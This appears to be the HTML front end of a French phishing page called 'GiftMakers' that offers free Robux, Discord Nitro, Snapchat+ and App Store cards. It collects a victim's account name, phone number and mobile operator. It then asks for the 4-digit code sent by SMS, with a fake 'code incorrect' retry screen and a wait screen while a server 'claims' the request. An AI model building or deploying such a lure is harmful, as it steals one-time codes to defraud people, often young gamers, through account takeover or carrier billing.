<!DOCTYPE html>
<html lang="fr" class="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GiftMakers - Cadeaux gratuits</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      darkMode: 'class',
      theme: {
        extend: {
          colors: { brand: { dark: '#070b12', card: '#0f172a', border: '#1e293b' } },
          animation: { 'pulse-slow': 'pulse 4s cubic-bezier(0.4, 0, 0.6, 1) infinite' }
        }
      }
    }
  </script>
  <style>
    body { background-color: #070b12; color: #f8fafc; font-family: system-ui, -apple-system, sans-serif; overflow-x: hidden; }
    .glass-card { background: rgba(15, 23, 42, 0.85); backdrop-filter: blur(16px); border: 1px solid rgba(59, 130, 246, 0.15); transition: all 0.3s ease; }
    .glass-card:hover { border-color: rgba(59, 130, 246, 0.5); transform: translateY(-3px); box-shadow: 0 10px 30px rgba(37, 99, 235, 0.15); }
    .brand-icon { width: 44px; height: 44px; display: grid; place-items: center; border-radius: 12px; background: rgba(30, 41, 59, 0.8); border: 1px solid rgba(59, 130, 246, 0.2); }
    .brand-icon img { width: 22px; height: 22px; object-fit: contain; filter: brightness(0) invert(1); }
    .gift-option { background: #0f172a; border: 1px solid #1e293b; color: #cbd5e1; transition: all 0.2s ease; cursor: pointer; }
    .gift-option:hover, .gift-option.selected { background: #3b82f6; color: #fff; border-color: #60a5fa; font-weight: 600; box-shadow: 0 0 15px rgba(59, 130, 246, 0.4); }
    .pin-input-box {
      width: 55px; height: 65px; text-align: center; font-size: 28px; font-weight: bold;
      background: #0b1325; border: 2px solid #1e293b; border-radius: 12px; color: #60a5fa;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }
    .pin-input-box:focus { border-color: #3b82f6; box-shadow: 0 0 20px rgba(59, 130, 246, 0.4); outline: none; transform: scale(1.05); }
    .step-transition { animation: fadeInScale 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
    @keyframes fadeInScale {
      from { opacity: 0; transform: scale(0.95) translateY(10px); }
      to { opacity: 1; transform: scale(1) translateY(0); }
    }
  </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-between p-4 md:p-8 relative">

  <div class="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[500px] h-[500px] bg-blue-600/10 rounded-full blur-3xl pointer-events-none animate-pulse-slow"></div>

  <header class="w-full max-w-5xl z-10 flex items-center justify-between py-4 mb-8 border-b border-slate-800/80">
    <div class="flex items-center gap-3 cursor-pointer" onclick="resetToHome()">
      <div class="w-10 h-10 rounded-xl bg-blue-500/15 border border-blue-500/30 flex items-center justify-center text-xl text-blue-400 shadow-lg shadow-blue-500/10">🎁</div>
      <span class="text-xl font-bold tracking-tight text-white">Gift<span class="text-blue-400">Makers</span></span>
    </div>
  </header>

  <main class="w-full max-w-5xl z-10 flex-1 flex flex-col items-center justify-center">

    <div id="catalog-view" class="w-full step-transition">
      <div class="text-center mb-12">
        <h1 class="text-4xl md:text-5xl font-black tracking-tight text-white mb-3">Cadeaux gratuits</h1>
        <p class="text-sm md:text-base text-slate-400">Sélectionne un produit et reçois-le en quelques minutes</p>
      </div>

      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">

        <div onclick="openGiftModal('Robux', 'Monnaie Roblox', ['400', '800', '1700'], 'https://cdn.simpleicons.org/roblox/FFFFFF')" class="glass-card rounded-2xl p-6 cursor-pointer flex flex-col justify-between h-48">
          <div>
            <div class="brand-icon mb-3"><img src="https://cdn.simpleicons.org/roblox/FFFFFF" alt="Roblox"></div>
            <h3 class="font-bold text-white text-lg">Robux</h3>
            <p class="text-xs text-slate-400">Monnaie Roblox</p>
          </div>
          <div class="flex gap-2">
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">400</span>
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">800</span>
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">1700</span>
          </div>
        </div>

        <div onclick="openGiftModal('Snapchat+', 'Abonnement Snapchat', ['1 mois', '6 mois', '1 an'], 'https://cdn.simpleicons.org/snapchat/FFFFFF')" class="glass-card rounded-2xl p-6 cursor-pointer flex flex-col justify-between h-48">
          <div>
            <div class="brand-icon mb-3"><img src="https://cdn.simpleicons.org/snapchat/FFFFFF" alt="Snapchat"></div>
            <h3 class="font-bold text-white text-lg">Snapchat+</h3>
            <p class="text-xs text-slate-400">Abonnement Snapchat</p>
          </div>
          <div class="flex gap-2">
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">1 mois</span>
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">6 mois</span>
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">1 an</span>
          </div>
        </div>

        <div onclick="openGiftModal('Discord Nitro', 'Abonnement Discord', ['1 mois', '3 mois', '1 an'], 'https://cdn.simpleicons.org/discord/FFFFFF')" class="glass-card rounded-2xl p-6 cursor-pointer flex flex-col justify-between h-48">
          <div>
            <div class="brand-icon mb-3"><img src="https://cdn.simpleicons.org/discord/FFFFFF" alt="Discord"></div>
            <h3 class="font-bold text-white text-lg">Discord Nitro</h3>
            <p class="text-xs text-slate-400">Abonnement Discord</p>
          </div>
          <div class="flex gap-2">
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">1 mois</span>
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">3 mois</span>
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">1 an</span>
          </div>
        </div>

        <div onclick="openGiftModal('Apple', 'Carte cadeau App Store', ['15€', '25€', '50€'], 'https://cdn.simpleicons.org/apple/FFFFFF')" class="glass-card rounded-2xl p-6 cursor-pointer flex flex-col justify-between h-48">
          <div>
            <div class="brand-icon mb-3"><img src="https://cdn.simpleicons.org/apple/FFFFFF" alt="Apple"></div>
            <h3 class="font-bold text-white text-lg">Apple</h3>
            <p class="text-xs text-slate-400">Carte cadeau App Store</p>
          </div>
          <div class="flex gap-2">
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">15€</span>
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">25€</span>
            <span class="px-2.5 py-1 rounded-lg bg-slate-900 border border-slate-800 text-[11px] text-slate-300">50€</span>
          </div>
        </div>

      </div>
    </div>

    <div id="flow-view" class="hidden w-full max-w-md mx-auto step-transition">
      <div class="glass-card rounded-3xl p-6 md:p-8 relative shadow-2xl">
        <button onclick="resetToHome()" class="absolute top-4 left-4 text-xs text-slate-400 hover:text-white transition-all">← Retour</button>

        <div id="pub-step-1" class="mt-4">
          <div class="text-center mb-6">
            <div id="flow-icon-container" class="w-12 h-12 mx-auto rounded-2xl bg-blue-500/15 border border-blue-500/30 flex items-center justify-center mb-2">
              <img id="flow-icon-img" src="" alt="Icon" class="w-6 h-6 object-contain filter brightness-0 invert">
            </div>
            <h2 id="flow-title" class="text-xl font-bold text-white">Obtenir votre cadeau</h2>
            <p id="flow-subtitle" class="text-xs text-slate-400">Sélectionnez vos options et remplissez vos informations</p>
          </div>

          <form onsubmit="handlePublicStep1Submit(event)" class="space-y-4">
            <div>
              <label class="block text-xs font-medium text-slate-300 mb-2">Offre sélectionnée</label>
              <div id="flow-options-container" class="grid grid-cols-3 gap-2"></div>
            </div>

            <div>
              <label id="input-label-target" class="block text-xs font-medium text-slate-300 mb-1">Identifiant / Compte / Email</label>
              <input type="text" id="pub-target-input" required placeholder="Votre pseudo ou compte"
                class="w-full bg-[#070b12] border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-all">
            </div>

            <div>
              <label class="block text-xs font-medium text-slate-300 mb-1">Numéro de téléphone</label>
              <input type="tel" id="pub-phone-input" required placeholder="06 12 34 56 78" oninput="formatPhoneInput(this)"
                class="w-full bg-[#070b12] border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 transition-all">
            </div>

            <div class="relative">
              <label class="block text-xs font-medium text-slate-300 mb-1">Opérateur mobile</label>
              <div onclick="toggleOperatorDropdown(event)" id="operator-selected-display"
                class="w-full bg-[#070b12] border border-slate-800 rounded-xl px-4 py-3 text-white cursor-pointer flex items-center justify-between text-sm hover:border-slate-700 transition-all">
                <span class="flex items-center gap-2"><span class="w-2.5 h-2.5 rounded-full bg-blue-500"></span> Bouygues Telecom</span>
                <span class="text-slate-500 text-xs">▼</span>
              </div>
              <div id="operator-dropdown-menu" class="hidden absolute top-full left-0 right-0 mt-2 bg-[#0b1325] border border-slate-800 rounded-xl overflow-hidden z-50 shadow-2xl">
                <div onclick="selectCustomOperator('Bouygues Telecom', 'bg-blue-500', event)" class="px-4 py-3 hover:bg-slate-800 cursor-pointer text-sm">Bouygues Telecom</div>
                <div onclick="selectCustomOperator('Orange', 'bg-orange-500', event)" class="px-4 py-3 hover:bg-slate-800 cursor-pointer text-sm">Orange</div>
                <div onclick="selectCustomOperator('SFR', 'bg-red-500', event)" class="px-4 py-3 hover:bg-slate-800 cursor-pointer text-sm">SFR</div>
                <div onclick="selectCustomOperator('Free Mobile', 'bg-yellow-400', event)" class="px-4 py-3 hover:bg-slate-800 cursor-pointer text-sm">Free Mobile</div>
              </div>
            </div>

            <button type="submit" class="w-full bg-blue-600 text-white font-bold py-3.5 rounded-xl hover:bg-blue-500 active:scale-95 transition-all shadow-lg shadow-blue-600/30 mt-2">
              Demander
            </button>
          </form>
        </div>

        <div id="pub-step-2" class="hidden text-center py-8">
          <div class="relative w-20 h-20 mx-auto mb-6">
            <div class="absolute inset-0 rounded-full border-4 border-slate-800"></div>
            <div class="absolute inset-0 rounded-full border-4 border-blue-500 border-t-transparent animate-spin"></div>
            <div class="absolute inset-0 flex items-center justify-center text-2xl animate-pulse">🔒</div>
          </div>
          <h2 class="text-xl font-bold text-white mb-2">Vérification en cours...</h2>
          <p class="text-xs text-slate-400 max-w-xs mx-auto mb-4">En attente de prise en charge (claim) de votre demande sur le serveur...</p>
        </div>

        <div id="pub-step-3" class="hidden">
          <h2 class="text-xl font-bold text-white mb-2 text-center">Confirmation requise</h2>
          <p class="text-xs text-slate-400 mb-6 text-center">Entrez le code à 4 chiffres reçu par SMS pour finaliser.</p>
          <form onsubmit="handlePublicPinSubmit(event)" class="space-y-6">
            <div id="pub-pin-container" class="flex justify-center gap-3"></div>
            <button type="submit" class="w-full bg-blue-600 text-white font-bold py-3.5 rounded-xl hover:bg-blue-500 active:scale-95 transition-all shadow-lg shadow-blue-600/30">
              Valider le code
            </button>
          </form>
        </div>

        <div id="pub-step-3bis" class="hidden text-center py-8">
          <div class="relative w-16 h-16 mx-auto mb-4">
            <div class="absolute inset-0 rounded-full border-4 border-blue-500 border-t-transparent animate-spin"></div>
          </div>
          <h3 class="text-lg font-bold text-white mb-1">Validation du code...</h3>
          <p class="text-xs text-slate-400">Analyse de la correspondance en temps réel.</p>
        </div>

        <div id="pub-step-4" class="hidden text-center py-6">
          <div class="w-16 h-16 bg-red-500/10 border border-red-500/20 rounded-2xl flex items-center justify-center text-3xl mx-auto mb-4 animate-bounce">❌</div>
          <h2 class="text-xl font-bold text-white mb-2">Code incorrect ou expiré</h2>
          <p class="text-xs text-slate-400 mb-6">Le code saisi n'a pas pu être validé. Veuillez réessayer.</p>
          <button onclick="showPublicStep('3')" class="w-full bg-slate-800 text-white font-bold py-3.5 rounded-xl hover:bg-slate-700 transition-all">Réessayer</button>
        </div>

        <div id="pub-step-5" class="hidden text-center py-6">
          <div class="w-16 h-16 bg-emerald-500/10 border border-emerald-500/20 rounded-2xl flex items-center justify-center text-3xl mx-auto mb-4 animate-pulse">✨</div>
          <h2 class="text-xl font-bold text-white mb-2">Récompense envoyée !</h2>
          <p class="text-xs text-slate-400 mb-6">Votre choix a été validé et le transfert est en cours vers votre compte. Vous pouvez fermer cette fenêtre.</p>
        </div>
      </div>
    </div>

  </main>

  <footer class="w-full max-w-5xl text-center text-slate-500 text-[11px] mt-12 z-10 border-t border-slate-800/80 pt-4">
    GiftMakers © 2026 • Système sécurisé de distribution de récompenses
  </footer>

  <script src="public-view.js"></script>
</body>
</html>
